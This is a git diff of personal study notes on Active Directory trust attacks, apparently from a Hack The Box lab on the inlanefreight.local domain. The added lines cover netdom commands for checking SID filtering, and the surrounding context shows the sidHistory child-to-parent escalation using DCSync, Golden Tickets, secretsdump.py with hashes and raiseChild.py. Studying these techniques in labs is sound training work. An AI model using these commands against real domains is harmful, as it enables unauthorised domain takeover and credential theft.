@@ -42,6 +42,9 @@ netdom query /domain:inlanefreight.local dc
 # Using netdom to query workstations and servers
 netdom query /domain:inlanefreight.local workstation
 
+# check if sid filtering enabled or not
+netdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine 
+netdom trust somedomain.com /domain:anotherdomain.com /quarantine
 
 ```
 
@@ -67,6 +70,7 @@ bloodhound
 - This attack allows for the compromise of a parent domain once the child domain has been compromised.
 - if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group
 - then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.
+- needs sid-filtring to be off
 
 ### Steps
 - comprmised DC in a child domain
@@ -158,6 +162,7 @@ secretsdump.py inlanefreight.local/administrator@172.16.5.5 -just-dc -hashes aad
 # the ip of parent DC then the child domain user
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
+
 
 # Cross-Forest Trust Abuse
 
